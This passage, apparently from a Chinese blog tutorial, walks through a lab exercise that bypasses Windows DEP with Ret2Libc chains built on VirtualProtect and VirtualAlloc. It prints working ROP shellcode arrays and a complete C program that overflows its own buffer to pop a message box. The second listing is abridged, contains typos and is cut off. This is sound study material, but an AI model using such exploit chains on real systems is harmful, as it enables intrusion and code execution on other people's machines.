所在内存区域设置为可执行模式</strong></p><ol><li>修改属性的内存地址（ebp+0x8）设置为当前堆栈中的某个地址</li></ol><p>现在我们的目标是动态覆盖掉 ebp+0x14，ebp+0x8，而要保证 ebp+0x10，ebp+0xC不变（由上面的分析可知，ebp+0x10，ebp+0xC 是两个固定参数）。</p><p>现在 ESP 刚好指向 EBP+8 的位置，如果此时我们能找到类似 MOV [EBP],** POP ** POP ** POP ** RETN 或者 MOV [EBP],** JMP **的指令就可以将要修改属性的内存地址设置为当前堆栈中的某个地址了。但是我们并没有找到这样的指令，我们不妨让 ESP 向下移动 4 个字节，然后执行一条 PUSH ESP RETN/JMP EAX 指令也能达到目的。那么什么样的指令能让 ESP 向高址方向移动 4字节，而不影响程序的控制？RETN指令，既能让 esp+4 又能收回程序控制权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x53\xe3\xec\x77&quot;</span> <span class="comment">//修正 EBP 77ECE353</span></span><br><span class="line"> 	<span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>运行调试。在 0x7CBBD9BA（调整EBP 入口）处下断点。运行到 JMP EAX 时暂停程序，观察当前内存状态。如下图所示，已经成功将 EBP+0x8 写为当前堆栈中的地址。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626101743336-165629394983520.png" alt="image-20220626101743336"></p><ol start="2"><li>保证 EBP+0x14 处存放的地址为可写地址</li></ol><p>让 ESP 指向 EBP+0x18，再用 PUSH ESP JMP EAX 指令来设置 EBP+0x14 的参数。</p><p>（1）观察堆栈，此时 ESP=0x0012FE70，EBP+0x14=0x0012FE7C，只需让 ESP 向高址方向移动 16 个字节，就能让 ESP 指向 EBP+0x18（=0x0012FE80）。使用类似 POP POP POP RETN指令（注意：不能修改 ESP、EBP、EAX）选用 0x7CBF1A0A 处的 POP ESI POP EBX POP EDI RETN 指令。</p><p>（2）用 PUSH ESP JMP EAX 指令设置 EBP+0x14 的参数。先要重新获得程序控制权，当前正在执行 jmp eax，所以要先使用 POP EAX RETN 指令地址覆盖 test() 返回地址，来将 0x7CBF1A0A 赋值给 EAX，才能执行 POP POP POP RETN指令。</p><p>（3）确定那两个固定参数，shellcode大小 0xff 就足够弹框代码用了，那个常量就用0x40。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">	<span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line">	<span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line">	<span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line">	<span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line">	<span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626110433976-165629394983521.png" alt="image-20220626110433976"></p><p>总结一下刚才的过程：<br> 1.首先通过pop eax ret将pop pop pop ret的地址保存到eax。<br> 2.修正ebp，由于是retn 4，所以要加4个字节的90填充。<br> 3.执行push esp，jmp eax，此时通过ebp索引的参数值已经可以对上号了，除了那个可写的地址。</p><p>（4）接下来要把 ESP 写入到 EBP+0x14 处。用 push esp jmp eax 来把 EBP+0x14 写为可写入地址。然后在执行完 pop pop pop retn 后返回到 virtualProtect() 来把 Shellcode 设置为可执行页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> 	<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">	<span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line">	<span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line">	<span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line">	<span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line">	<span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line">	<span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span><span class="comment">//修改内存属性</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626105048718-165629394983522.png" alt="image-20220626105048718"></p><p>如下图所示，EAX 的值为 1， 根据 MSDN 的介绍说明我们已经成功修改了内存属性。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626111913356-165629394983523.png" alt="image-20220626111913356"></p><p><strong>（ 3）跳转到 shellcode 执行</strong></p><p>接下来的布置工作很简单，在位置 0X12FE98 放置 JMP ESP 指令，并在 RETN 0x10 后 ESP 指向的位置（0x0012FEAC）开始放置弹出对话框的机器码，实现 exploit。</p><p>按下图布置 shellcode：<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626114457594-165629394983525.png" alt="image-20220626114457594"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">	<span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line">	<span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP ,push esp pop ebp retn</span></span><br><span class="line">	<span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line">	<span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line">	<span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line">	<span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span><span class="comment">//修改内存属性</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xA4\xDE\xA2\x7C&quot;</span><span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">	<span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,shellcode,<span class="number">420</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序，弹出 “failwest” 对话框，攻击成功，如下图。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626112209723-165629394983524.png" alt="image-20220626112209723"></p><h3 id="ret2libc-实战之利用-virtualalloc"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-virtualalloc"></a> Ret2Libc 实战之利用 VirtualAlloc</h3><p>除了修改属性外，我们还可以通过 kernel32.dll 中的 VirtualAlloc 函数来申请一段具有可执行属性的内存。 我们就可以将 Ret2Libc 的第一跳设置为 VirtualAlloc 函数地址，然后将shellcode 复制到申请的内存空间里，以绕过 DEP 的限制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID WINAPI <span class="title function_">VirtualAlloc</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in_opt	LPVOID lpAddress,	<span class="comment">//申请内存区域的地址，如果这个参数是 NULL，系统将会决定分配内存区域的位置，并且按 64KB 向上取整。</span></span></span><br><span class="line"><span class="params">    __in 		SIZE_T dwSize,	<span class="comment">//申请内存区域的大小。</span></span></span><br><span class="line"><span class="params">    __in 		DWORD flAllocationType,	<span class="comment">//申请内存区域的大小。</span></span></span><br><span class="line"><span class="params">    __in 		DWORD flProtect		<span class="comment">//申请内存的访问控制类型，如读、写、执行等权限。</span></span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//内存申请成功时函数返回申请内存的起始地址，申请失败时返回 NULL。</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626115522694-165629394983526.png" alt="image-20220626115522694"></p><p>安照如下参数布置函数，来申请可执行的空间。</p><p>VirtualAlloc(0x0030000, 0xFF, 0x00001000, 0x00000040)</p><p>（ 1） lpAddress=0x00030000，只要选择一个未被占用的地址即可，没有什么特殊要求。<br>（ 2） dwSize=0xFF，申请空间的大小可以根据 shellcode 的长度确定，本次实验申请 255 个字节，足够 shellcode 使用。<br>（ 3） flAllocationType=0x00001000，该值使用 0x00001000 即可， 如有特殊需要可根据 MSDN的介绍来设置为其他值。<br>（ 4） flProtect=0x00000040，内存属性要设置为可读可写可执行，根据 MSDN 介绍，该属性对应的代码为 0x00000040。</p><h4 id="实验代码-3"><a class="markdownIt-Anchor" href="#实验代码-3"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//申请空间</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，转入执行用</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x90\x90\x94&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    chartt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(tt,shellcode,<span class="number">450</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCEhInst = LoadLibrary(<span 